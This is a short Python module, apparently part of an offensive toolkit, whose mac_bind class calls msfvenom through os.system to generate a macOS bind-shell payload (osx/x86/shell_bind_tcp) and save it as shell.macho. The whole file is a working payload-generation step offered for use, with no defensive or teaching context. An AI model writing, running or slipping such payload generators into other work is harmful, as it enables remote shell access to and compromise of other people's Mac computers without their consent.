#Modules
from etc.banner import banner_drgn
from etc.set import clear
from etc.set import *
from lib.list import list_tools
from lib.list import list_Mac
#===================
import sys,os,socket,time,datetime
#===================
NFound='\n\u001b[1m[\u001b[31mNot Found Choice!\u001b[0m\u001b[1m]\u001b[0m'
Aborted='\n\u001b[1m[\u001b[31mABORTED!\u001b[0m\u001b[1m]\u001b[0m'
#===================
class mac_bind:
    def __init__(self, lhost):
        self.lhost = lhost
        try:
            clear()
            print('''
  [+] LOCAL HOST : {}
  [+] REMOTE HOST: 127.0.0.1
  [!] Loading ....'''.format(self.lhost))
            os.system('msfvenom -p osx/x86/shell_bind_tcp RHOST=127.0.0.1 LHOST={} -f macho > shell.macho'.format(self.lhost))
            sys.exit('\u001b[1m[\u001b[32;1mSUCCESSFULLY\u001b[0m\u001b[1m]\u001b[0m')
        except KeyboardInterrupt:
            sys.exit(Aborted)
